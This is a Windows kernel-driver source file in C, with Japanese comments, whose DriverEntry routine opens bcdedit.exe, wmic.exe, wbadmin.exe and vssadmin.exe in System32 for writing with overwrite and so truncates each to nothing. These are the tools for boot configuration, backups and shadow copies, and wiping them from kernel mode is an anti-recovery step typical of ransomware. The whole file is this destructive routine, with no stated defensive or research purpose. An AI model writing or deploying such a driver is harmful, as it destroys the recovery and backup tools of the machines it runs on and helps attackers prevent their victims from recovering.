#include <Ntifs.h>
#include <Ntddk.h>
#pragma warning(disable: 4100)
#pragma warning(disable: 4701)
#pragma warning( push )
#pragma warning( disable: 4201 4214 )
#pragma warning( pop )

//CopySouce.c　作成者:R.T.
//作成日時: 2022年3月

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNICODE_STRING     uniName;
    OBJECT_ATTRIBUTES  objAttr;

    RtlInitUnicodeString(&uniName, L"\\SystemRoot\\System32\\bcdedit.exe");  //  L"\\SystemRoot\\example.txt"　という形式でフルパス
    InitializeObjectAttributes(&objAttr, &uniName,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL, NULL);


    HANDLE   handle;
    NTSTATUS ntstatus;
    IO_STATUS_BLOCK    ioStatusBlock;
   

   
    

    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
        return STATUS_INVALID_DEVICE_STATE;


    //ファイルのハンドルを開く


    ntstatus = ZwCreateFile(&handle,
        GENERIC_WRITE,
        &objAttr, &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

   

    if (NT_SUCCESS(ntstatus)) {
        UNICODE_STRING U_Name;
        OBJECT_ATTRIBUTES Attr;

        RtlInitUnicodeString(&U_Name, L"\\SystemRoot\\System32\\wbem\\wmic.exe");
        InitializeObjectAttributes(&Attr, &U_Name,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            NULL, NULL);


        HANDLE FHandle;
        NTSTATUS status;
        IO_STATUS_BLOCK    IoStatus;
        


        if (KeGetCurrentIrql() != PASSIVE_LEVEL)
            return STATUS_INVALID_DEVICE_STATE;


        //ファイルのハンドルを開く


        status = ZwCreateFile(&FHandle,
            GENERIC_WRITE,
            &Attr, &IoStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0);






        if (NT_SUCCESS(status)) {
            UNICODE_STRING     Unicode;
            OBJECT_ATTRIBUTES  Object;

            RtlInitUnicodeString(&Unicode, L"\\SystemRoot\\System32\\wbadmin.exe");  
            InitializeObjectAttributes(&Object, &Unicode,
                OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                NULL, NULL);

            HANDLE   FileHandle;
            NTSTATUS nt_s;
            IO_STATUS_BLOCK    Io_S_B;

            
            

            if (KeGetCurrentIrql() != PASSIVE_LEVEL)
                return STATUS_INVALID_DEVICE_STATE;

            //ファイルのハンドルを開く

            nt_s = ZwCreateFile(&FileHandle,
                GENERIC_WRITE,
                &Object, &Io_S_B, NULL,
                FILE_ATTRIBUTE_NORMAL,
                0,
                FILE_OVERWRITE_IF,
                FILE_SYNCHRONOUS_IO_NONALERT,
                NULL, 0);

            if (NT_SUCCESS(nt_s)) {


                UNICODE_STRING     uni_Name;
                OBJECT_ATTRIBUTES  obj_Attr;

                RtlInitUnicodeString(&uni_Name, L"\\SystemRoot\\System32\\vssadmin.exe");  
                InitializeObjectAttributes(&obj_Attr, &uni_Name,
                    OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                    NULL, NULL);

                HANDLE   handle_;
                NTSTATUS ntstatus_;
                IO_STATUS_BLOCK    ioStatusBlock_;

              

                if (KeGetCurrentIrql() != PASSIVE_LEVEL)
                    return STATUS_INVALID_DEVICE_STATE;

                //ファイルのハンドルを開く

                ntstatus_ = ZwCreateFile(&handle_,
                    GENERIC_WRITE,
                    &obj_Attr, &ioStatusBlock_, NULL,
                    FILE_ATTRIBUTE_NORMAL,
                    0,
                    FILE_OVERWRITE_IF,
                    FILE_SYNCHRONOUS_IO_NONALERT,
                    NULL, 0);

                ZwClose(handle_);

            }

            ZwClose(FileHandle);
        }

        ZwClose(FHandle);
    }

    ZwClose(handle);
    
  return STATUS_SUCCESS;
}
